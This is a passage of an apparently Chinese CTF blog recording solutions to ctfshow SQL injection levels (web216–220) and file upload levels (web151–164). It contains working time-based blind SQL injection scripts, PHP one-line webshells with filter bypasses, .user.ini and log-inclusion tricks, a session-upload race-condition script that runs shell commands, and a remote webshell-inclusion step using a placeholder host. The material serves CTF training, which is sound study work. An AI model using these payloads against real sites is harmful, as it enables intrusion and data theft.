table_name=&#x27;ctfshow_flagxcc&#x27;),&#123;&#125;,1))=&#123;&#125;),sleep(3),1)#&quot;.format(i,ord(x))</span></span><br><span class="line">        <span class="comment">#id,flagaac,i</span></span><br><span class="line">        payload = <span class="string">&quot;&#x27;adb&#x27;) or if((ascii(substr((select flagaac from ctfshow_flagxcc),&#123;&#125;,1))=&#123;&#125;),sleep(3),1)#&quot;</span>.<span class="built_in">format</span>(i,<span class="built_in">ord</span>(x))</span><br><span class="line">        <span class="built_in">print</span>(payload)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;ip&quot;</span>:payload,</span><br><span class="line">            <span class="string">&quot;debug&quot;</span>:<span class="number">1</span>,</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            res = requests.post(url = url,data = data,timeout=<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            time.sleep(<span class="number">0.3</span>)</span><br><span class="line">            flag+=x</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;----------------------&quot;</span>+flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#try except  ---&gt;这两个是处理异常用的，如果执行sleep(3)了话，那对try来说就是异常了，因为timeout规定的是2s,异常的话就会执行except下的代码。</span></span><br></pre></td></tr></table></figure><h2 id="web217"><a href="#web217" class="headerlink" title="web217"></a>web217</h2><p>源码</p><p><img src="../images/image-20230103192035743.png" alt="image-20230103192035743"></p><p>这里是吧sleep给过滤掉了。那么我们就可以用别的函数来替代sleep了。</p><p>这里就得用到benchmark函数了。</p><p><img src="../images/image-20230103192546638.png" alt="image-20230103192546638"></p><p>这个函数的功能 benchmark(次数，实现的计算)      </p><p>上图的意思就是进行了100000000次md5(1)的计算。</p><p>脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">url=<span class="string">&#x27;http://5d44e38e-dd70-49f9-aa22-472a67c5d0bb.challenge.ctf.show/api/index.php&#x27;</span></span><br><span class="line">flagstr=<span class="string">&quot;&#123;&#125;qwertyuiopasdfghjklzxcvbnm-_,0123456789&quot;</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> flagstr:</span><br><span class="line">        <span class="comment">#payload = &quot;if((ascii(substr((select database()),&#123;&#125;,1))=&#123;&#125;),sleep(3),1)#&quot;.format(i,ord(x))</span></span><br><span class="line">        <span class="comment">#ctfshow_web</span></span><br><span class="line">        <span class="comment">#payload = &quot;999) or if((ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))=&#123;&#125;),benchmark(5000000,md5(1)),1)#&quot;.format(i,ord(x))</span></span><br><span class="line">        <span class="comment">#ctfshow_flagxccb,ct</span></span><br><span class="line">        <span class="comment">#payload = &quot;999) or if((ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flagxccb&#x27;),&#123;&#125;,1))=&#123;&#125;),benchmark(5000000,md5(1)),1)#&quot;.format(i,ord(x))</span></span><br><span class="line">        <span class="comment">#id,flagaabc,i</span></span><br><span class="line">        payload = <span class="string">&quot;999) or if((ascii(substr((select flagaabc from ctfshow_flagxccb),&#123;&#125;,1))=&#123;&#125;),benchmark(5000000,md5(1)),1)#&quot;</span>.<span class="built_in">format</span>(i,<span class="built_in">ord</span>(x))</span><br><span class="line">        <span class="built_in">print</span>(payload)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;ip&quot;</span>:payload,</span><br><span class="line">            <span class="string">&quot;debug&quot;</span>:<span class="number">1</span>,</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            res = requests.post(url = url,data = data,timeout=<span class="number">2</span>)</span><br><span class="line">            time.sleep(<span class="number">0.3</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line"></span><br><span class="line">            flag+=x</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;----------------------&quot;</span>+flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#try except  ---&gt;这两个是处理异常用的，如果执行sleep(3)了话，那对try来说就是异常了，因为timeout规定的是2s,异常的话就会执行except下的代码。</span></span><br></pre></td></tr></table></figure><h2 id="web218"><a href="#web218" class="headerlink" title="web218"></a>web218</h2><p>源码</p><p><img src="../images/image-20230103202950013.png" alt="image-20230103202950013"></p><p>这次把sleep和benchmark都给过滤掉了，那么我们还可以利用笛卡尔乘积</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">笛卡尔积又叫笛卡尔乘积，是一个叫笛卡尔的人提出来的。</span><br><span class="line">简单的说就是两个集合相乘的结果。</span><br><span class="line">具体的定义去看看有关代数系的书的定义。</span><br><span class="line">直观的说就是</span><br><span class="line">集合A&#123;a1,a2,a3&#125;</span><br><span class="line">集合B&#123;b1,b2&#125;</span><br><span class="line">他们的</span><br><span class="line">笛卡尔积</span><br><span class="line">是</span><br><span class="line">A*B</span><br><span class="line">=&#123;(a1,b1),(a1,b2),(a2,b1),(a2,b2),(a3,b1),(a3,b2)&#125;</span><br></pre></td></tr></table></figure><p>离散数学里会学到这个东西。</p><p><img src="../images/image-20230103225712432.png" alt="image-20230103225712432"></p><p><img src="../images/image-20230103230559724.png" alt="image-20230103230559724"></p><p><strong>这就是mysql里的笛卡尔乘积。</strong></p><p>这里能让其产生延迟的感觉就是查大量的数据的时候就会产生延迟。</p><p>脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://45f61877-517c-463b-adae-cc648e4d6531.challenge.ctf.show/api/index.php&quot;</span></span><br><span class="line"></span><br><span class="line">strr = <span class="string">&quot;1234567890&#123;&#125;-qazwsxedcrfvtgbyhnujmikolp&quot;</span></span><br><span class="line">j = <span class="number">1</span></span><br><span class="line">res = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> strr:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;ip&#x27;</span>: <span class="string">f&quot;1) and if(substr((select flagaac from ctfshow_flagxc),<span class="subst">&#123;j&#125;</span>,1)=&#x27;<span class="subst">&#123;i&#125;</span>&#x27;,(select count(*) from ((select table_name from information_schema.columns)a,(select table_name from information_schema.columns)b,(select table_name from information_schema.columns limit 1,7)c) limit 1),1&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;debug&#x27;</span>: <span class="string">&#x27;1&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.post(url, data=data, timeout=<span class="number">2.5</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            res += i</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;-----------------------&quot;</span>+res)</span><br><span class="line">            j+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1) and if(substr((select database())),&#123;j&#125;,1)=&#x27;&#123;i&#125;&#x27;,(select count(*) from ((select table_name from information_schema.columns)a,(select table_name from information_schema.columns)b,(select table_name from information_schema.columns limit 1,7)c) limit 1),1</span><br></pre></td></tr></table></figure><p>可以第一个if判断改成2&gt;1,拿去题目那试一下，看是否产生延迟.</p><p><strong>limit</strong></p><p><img src="../images/image-20230104001113081.png" alt="image-20230104001113081"></p><p><img src="../images/image-20230104001125935.png" alt="image-20230104001125935"></p><p>limit 1,1就是返回第一行的数。<br><img src="../images/image-20230104001335990.png" alt="image-20230104001335990"></p><p>这个是返回第一行后面2行的数。</p><p>还有等等种可能，不理解的时候可以去本地去自己查询来理解。</p><h2 id="web219"><a href="#web219" class="headerlink" title="web219"></a>web219</h2><p>源码</p><p><img src="../images/image-20230104002030913.png" alt="image-20230104002030913"></p><p>把这个东西给过滤掉了，这里就得知<strong>rlike</strong>也是可以进行时间盲注的。</p><p>这里就要五种方法来进行时间盲注，<strong>sleep</strong>  <strong>benchmark</strong> <strong>rlike</strong>  <strong>笛卡尔乘积</strong> 还有一种是<strong>双链接</strong></p><p>双链接是啥我也不太清楚，感兴趣的可以自己去查查。</p><p><strong>rlike</strong></p><p>就是利用正则表达式来做.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">正侧匹配在匹配较长字符串但自由度比较高的字符串时会造成比较大的计算量，我们通过rpad或repeat构造长字符串，加以计算量大的pattern,通过控制字符串长度我们可以控制延时</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT if(1=1,(select rpad(&#x27;a&#x27;,4999999,&#x27;a&#x27;) RLIKE concat(repeat(&#x27;(a.*)+&#x27;,30),&#x27;b&#x27;)),0)</span><br></pre></td></tr></table></figure><p>这里用上一道题的脚本就行了。</p><p>脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Author:Y4tacker</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://45f61877-517c-463b-adae-cc648e4d6531.challenge.ctf.show/api/index.php&quot;</span></span><br><span class="line"></span><br><span class="line">strr = <span class="string">&quot;1234567890&#123;&#125;-qazwsxedcrfvtgbyhnujmikolp&quot;</span></span><br><span class="line"><span class="comment"># payload = &quot;select table_name from information_schema.tables where table_schema=database() limit 0,1&quot;</span></span><br><span class="line"><span class="comment"># payload = &quot;select column_name from information_schema.columns where table_name=&#x27;ctfshow_flagxc&#x27; limit 1,1&quot;</span></span><br><span class="line"><span class="comment"># payload = &quot;select flagaac from ctfshow_flagxc&quot;</span></span><br><span class="line">j = <span class="number">1</span></span><br><span class="line">res = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> strr:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;ip&#x27;</span>: <span class="string">f&quot;1) and if(substr((select flagaac from ctfshow_flagxc),<span class="subst">&#123;j&#125;</span>,1)=&#x27;<span class="subst">&#123;i&#125;</span>&#x27;,(select count(*) from ((select table_name from information_schema.columns)a,(select table_name from information_schema.columns)b,(select table_name from information_schema.columns limit 1,7)c) limit 1),1&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;debug&#x27;</span>: <span class="string">&#x27;1&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.post(url, data=data, timeout=<span class="number">2.5</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            res += i</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;-----------------------&quot;</span>+res)</span><br><span class="line">            j+=<span class="number">1</span></span><br><span class="line">          </span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="web220"><a href="#web220" class="headerlink" title="web220"></a>web220</h2><p>源码</p><p><img src="../images/image-20230104003951518.png" alt="image-20230104003951518"></p><p>把substr给给过滤掉了，那么我们就得去使用别的函数了，left,right这些都可以。</p><p>脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><h2 id="后面的sql题找个机会再去做，先做到这了"><a href="#后面的sql题找个机会再去做，先做到这了" class="headerlink" title="后面的sql题找个机会再去做，先做到这了"></a>后面的sql题找个机会再去做，先做到这了</h2>]]></content>
      
      
      
        <tags>
            
            <tag> ctfshow sql注入 刷题记录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow 文件上传 刷题记录</title>
      <link href="/posts/8b3f0eaf.html"/>
      <url>/posts/8b3f0eaf.html</url>
      
        <content type="html"><![CDATA[<p>文件上传检测有三个</p><ol><li><strong>文件名</strong></li><li><strong>文件类型</strong></li><li><strong>文件内容</strong></li></ol><h2 id="web151"><a href="#web151" class="headerlink" title="web151"></a>web151</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221224204215335.png" alt="image-20221224204215335"></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221224203050054.png" alt="image-20221224203050054"></p><p>windows下合成图片码方法。</p><p>然后传图片码</p><p>进行抓包</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221224204251719.png" alt="image-20221224204251719"></p><p>抓包后修改后缀为php，然后访问。</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221224204343141.png" alt="image-20221224204343141"></p><p>出现这种情况就是成功了，然后用蚁剑连接</p><p>然后就可以拿到flag了。</p><p><strong>解法二</strong></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221224204852845.png" alt="image-20221224204852845"></p><p>直接把这里的png限制给改成php，那么就可以直接上传一句话木马了，然后进行rce了。</p><h2 id="web152"><a href="#web152" class="headerlink" title="web152"></a>web152</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221224205346493.png" alt="image-20221224205346493"></p><p>还是一样的格式，</p><p>那么还是上传图片码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">图片码就是一句话木马&lt;?php eval($_POST[1]);?&gt;  加上任意一张图片组成的图片码。</span><br></pre></td></tr></table></figure><p>上传成功后进行修改后缀。</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221224205601789.png" alt="image-20221224205601789"></p><p>然后就去访问url/upload/normal_upload.php  </p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221224205644437.png" alt="image-20221224205644437"></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221224205655846.png" alt="image-20221224205655846"></p><p>然后就可以拿到flag了。</p><h2 id="web153"><a href="#web153" class="headerlink" title="web153"></a>web153</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221224213230135.png" alt="image-20221224213230135"></p><p>这道题居然这么快就用到<code>.user.ini</code>,我以为还要到后面的题。</p><p><a href="https://blog.csdn.net/qq_63548648/article/details/128165642">https://blog.csdn.net/qq_63548648/article/details/128165642</a>   这是我对 .htacess和.user.ini用法的总结。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这里虽然改文件后缀可以绕过，但是网站无法进行解析，蚁剑也不能连接。所以就得去用.user.ini了</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221224231943017.png" alt="image-20221224231943017"></p><p>先上传一张图片，然后通过改图片名和内容，上传.user.ini</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221224232145899.png" alt="image-20221224232145899"></p><p>这里上传的<code>auto_append_file</code>后面跟着的文件名要和后面上传的文件名一样</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221224232300737.png" alt="image-20221224232300737"></p><p>成功上传，然后去访问/upload/就行</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221224232348250.png" alt="image-20221224232348250"></p><p>出现这种情况就代表成功了，然后进行蚁剑连接就能拿到flag了。</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221224232529978.png" alt="image-20221224232529978"></p><h2 id="web154"><a href="#web154" class="headerlink" title="web154"></a>web154</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221224233441983.png" alt="image-20221224233441983"></p><p>这道题和上一题解法一样，只不过这道题是把php给过滤掉了，但是我们可以利用短标签</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php eval($_POST[1]);?&gt;   ---&gt;  &lt;?= eval($_POST[1]);?&gt;</span><br></pre></td></tr></table></figure><h2 id="web155"><a href="#web155" class="headerlink" title="web155"></a>web155</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221224233918091.png" alt="image-20221224233918091"></p><p>解法和web154一样，就不多写了</p><h2 id="web156"><a href="#web156" class="headerlink" title="web156"></a>web156</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225003016143.png" alt="image-20221225003016143"></p><p>和上一题解法一样，只不过这里过滤了[],那么可以把代码改成{}</p><p>还有不一样的是   上传的图片里不能带内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?= eval($_POST&#123;1&#125;);?&gt;</span><br></pre></td></tr></table></figure><h2 id="web157"><a href="#web157" class="headerlink" title="web157"></a>web157</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225003245068.png" alt="image-20221225003245068"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">这里和前两题的差别是这里的&lt;?php eval($_POST[1]);?&gt;不能用了，因为就是&#123;&#125;[]都被过滤了，那么我们就可以换另一种写法</span><br><span class="line">&lt;?= eval($_POST[1])?&gt;  ---&gt;  php中不带;也是可以正常执行代码的</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225004524802.png" alt="image-20221225004524802"></p><p>这里就是和上一题不同的地方。   </p><p>然后其他都一样。</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225004647307.png" alt="image-20221225004647307"></p><h2 id="web158"><a href="#web158" class="headerlink" title="web158"></a>web158</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225004739667.png" alt="image-20221225004739667"></p><p>和上一题解法一样，就不多说了。</p><h2 id="web159"><a href="#web159" class="headerlink" title="web159"></a>web159</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225005311958.png" alt="image-20221225005311958"></p><p>这道题可以使用文件的日志包含。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include &#x27;/var/lo&#x27;.&#x27;g/nginx/access/lo&#x27;.&#x27;g&#x27;  因为log被过滤了，那么只能用这种方法了</span><br></pre></td></tr></table></figure><p><strong>第一步</strong></p><p>就是先上传.user.ini以后，然后进行日志包含</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225132701372.png" alt="image-20221225132701372"></p><p><strong>第二步</strong></p><p>传一句话木马</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225132752973.png" alt="image-20221225132752973"></p><p><strong>第三步</strong></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225132810021.png" alt="image-20221225132810021"></p><p>进行rce。</p><h2 id="web160"><a href="#web160" class="headerlink" title="web160"></a>web160</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225133639357.png" alt="image-20221225133639357"></p><p>这题和上一题的解法一样，只不过这题把空格给过滤了，那么可以用%0d来替代，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=include1&#x27;/var/lo&#x27;.&#x27;g/nginx/access.lo&#x27;.&#x27;g&#x27;?&gt;   然后转到Hex这里找的1所在的位置，然后把1的16进制处改成0d就可</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225133949942.png" alt="image-20221225133949942"></p><p>在空格被过滤的时候   可以用<strong>0a 0b 0c 0d</strong>来替代</p><h2 id="web161"><a href="#web161" class="headerlink" title="web161"></a>web161</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225151417817.png" alt="image-20221225151417817"></p><p>还是一样的东西，这不过这里过滤了好多，试了下，就是把png头给过滤掉了。</p><p>这里用GIF图片头可以绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225151910771.png" alt="image-20221225151910771"></p><p>那么接下来就可以用.user.ini了。</p><p>上传.user.ini的时候也要加上GIF89a头</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225152324031.png" alt="image-20221225152324031"></p><p>然后就去和前面一样进行日志包含了。</p><p>然后进行rce就行了。</p><h2 id="web162"><a href="#web162" class="headerlink" title="web162"></a>web162</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225153759215.png" alt="image-20221225153759215"></p><p>这里经过测试不能用        <strong>.</strong></p><p>那么我们就可以用远程文件包含或者session条件竞争或者利用ascii构造代码(就是利用异或    或    非   与  等来构造)</p><p><strong>解法一</strong></p><p>条件竞争   </p><p><a href="https://blog.csdn.net/miuzzx/article/details/109537262?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161223805616780262526924%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=161223805616780262526924&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-109537262.pc_search_result_no_baidu_js&amp;utm_term=ctfshow%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0&amp;spm=1018.2226.3001.4187">https://blog.csdn.net/miuzzx/article/details/109537262?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161223805616780262526924%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=161223805616780262526924&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-109537262.pc_search_result_no_baidu_js&amp;utm_term=ctfshow%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0&amp;spm=1018.2226.3001.4187</a></p><p>yu师傅写的，可以来参考，我就不写了</p><p><strong>条件竞争代码</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line">session=requests.session()</span><br><span class="line">sess=<span class="string">&#x27;yu22x&#x27;</span></span><br><span class="line">url1=<span class="string">&quot;http://f275f432-9203-4050-99ad-a185d3b6f466.chall.ctf.show/&quot;</span></span><br><span class="line">url2=<span class="string">&quot;http://f275f432-9203-4050-99ad-a185d3b6f466.chall.ctf.show/upload&quot;</span></span><br><span class="line">data1=&#123;</span><br><span class="line"><span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>:<span class="string">&#x27;&lt;?php system(&quot;tac ../f*&quot;);?&gt;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">file=&#123;</span><br><span class="line"><span class="string">&#x27;file&#x27;</span>:<span class="string">&#x27;yu22x&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">cookies=&#123;</span><br><span class="line"><span class="string">&#x27;PHPSESSID&#x27;</span>: sess</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>():</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">r = session.post(url1,data=data1,files=file,cookies=cookies)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>():</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">r = session.get(url2)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br><span class="line">threads = [threading.Thread(target=write),</span><br><span class="line">       threading.Thread(target=read)]</span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">t.start()</span><br></pre></td></tr></table></figure><p><strong>解法二</strong></p><p>可以利用vps来写，但是这里我不懂搭，而且群主的视频里那个vps打不开了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://your-shell.com/1</span><br><span class="line">http://731540450/1</span><br></pre></td></tr></table></figure><p><img src="file:///C:\Users\sdbdb\AppData\Roaming\Tencent\QQTempSys\%W@GJ$ACOF(TYDYECOKVDYB.png" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=include&#x27;http://xxxxx/&#x27;?&gt;  ---&gt;这个网址里是一句话木马  &lt;?php eval($_POST[1]);?&gt;</span><br></pre></td></tr></table></figure><p>然后直接访问url/upload进行rce就能拿到flag了。</p><h2 id="web163"><a href="#web163" class="headerlink" title="web163"></a>web163</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225163327014.png" alt="image-20221225163327014"></p><p>这里就有两种解法，一种是条件竞争，一种就是利用vps</p><p>因为手头上没有vps那么这道题就空着了.</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225163510878.png" alt="image-20221225163510878"></p><p>如果有的话，直接直接上传，然后访问/upload就行了，</p><h2 id="web164"><a href="#web164" class="headerlink" title="web164"></a>web164</h2><p>源码</p><p><img 